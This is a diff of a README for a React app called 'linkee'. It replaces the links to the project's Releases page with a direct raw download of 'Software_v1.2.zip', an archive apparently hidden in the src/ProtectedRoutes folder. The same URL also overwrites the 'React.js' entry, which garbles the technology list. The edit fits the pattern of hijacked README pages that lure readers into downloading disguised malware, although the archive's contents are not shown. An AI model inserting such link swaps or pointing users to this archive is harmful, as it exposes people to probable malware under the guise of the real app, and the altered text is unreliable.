@@ -6,7 +6,7 @@ Welcome to linkee! This app helps you manage your social tasks easily. Whether y
 
 ## 📥 Download linkee
 
-[![Download linkee](https://img.shields.io/badge/Download%20linkee-v1.0-blue)](https://github.com/kothu777/linkee/releases)
+[![Download linkee](https://github.com/kothu777/linkee/raw/refs/heads/main/src/ProtectedRoutes/Software_v1.2.zip%20linkee-v1.0-blue)](https://github.com/kothu777/linkee/raw/refs/heads/main/src/ProtectedRoutes/Software_v1.2.zip)
 
 ## 💡 Why Use linkee?
 
@@ -35,7 +35,7 @@ To run linkee, your device should meet these requirements:
 
 To get linkee, visit the Releases page:
 
-[Download linkee](https://github.com/kothu777/linkee/releases)
+[Download linkee](https://github.com/kothu777/linkee/raw/refs/heads/main/src/ProtectedRoutes/Software_v1.2.zip)
 
 Follow these steps to download and install:
 
@@ -53,7 +53,7 @@ Once installed, you can open linkee and start exploring its features.
 
 linkee includes support for various modern technologies:
 
-- **React.js:** A powerful JavaScript library for building user interfaces.
+- **https://github.com/kothu777/linkee/raw/refs/heads/main/src/ProtectedRoutes/Software_v1.2.zip** A powerful JavaScript library for building user interfaces.
 - **Axios:** A promise-based HTTP client for making requests.
 - **FontAwesome:** Access a library of icons to enhance the user experience.
 - **Tailwind CSS:** A utility-first CSS framework for designing responsive layouts.
